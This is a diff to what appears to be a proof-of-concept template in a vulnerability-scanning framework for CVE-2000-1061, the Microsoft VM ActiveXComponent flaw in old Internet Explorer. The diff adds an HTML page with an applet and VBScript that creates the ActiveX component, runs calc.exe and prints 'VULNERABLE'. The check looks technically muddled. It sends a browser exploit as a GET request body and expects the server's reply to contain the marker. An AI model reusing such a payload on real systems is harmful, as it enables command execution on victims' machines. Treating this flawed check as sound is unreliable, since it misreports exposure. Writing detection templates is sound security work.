@@ -1,10 +1,15 @@
 [info]
 author = "AVE"
-description = "Microsoft Virtual Machine ActiveX 组件任意程序执行漏洞验证 - 通过构造包含 com.ms.activeX.ActiveXComponent 的恶意 HTML 页面，利用 IE 4.x/5.x 的 Java 虚拟机创建 ActiveX 控件，绕过安全限制执行任意命令"
+description = "检测 Microsoft VM 中 com.ms.activeX.ActiveXComponent 漏洞。通过构造包含恶意 Java Applet 的 HTML 页面，利用未签名 Applet 创建并调用 ActiveX 控件，绕过 IE 安全策略以当前用户权限执行任意命令。影响 IE 4.x/5.x 及 Microsoft VM 2000/3100/3200/3300 系列。"
 id = "POC-AVE-2000-0769"
-name = "CVE-2000-1061 PoC"
+name = "Microsoft VM ActiveXComponent Arbitrary Program Execution PoC"
 severity = "medium"
-tags = ["cve-2000-1061"]
+tags = [
+    "cve-2000-1061",
+    "ms00-075",
+    "activex",
+    "java-vm",
+]
 vuln_id = [
     "CVE-2000-1061",
     "AVE-2000-0769",
@@ -15,15 +20,31 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cve-2000-1061-poc.html"
+path = "/{{BaseURL}}/poc.html"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = """
+<HTML>
+<BODY>
+<APPLET CODE="ActiveXComponent.class" WIDTH=1 HEIGHT=1>
+<PARAM NAME="cabbase" VALUE="ActiveXComponent.cab">
+</APPLET>
+<SCRIPT language="VBScript">
+On Error Resume Next
+Set obj = CreateObject("com.ms.activeX.ActiveXComponent")
+If IsObject(obj) Then
+  obj.run("calc.exe")
+  Document.Write "VULNERABLE: ActiveXComponent created successfully"
+End If
+</SCRIPT>
+</BODY>
+</HTML>
+"""
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["com.ms.activeX.ActiveXComponent"]
+words = ["VULNERABLE"]
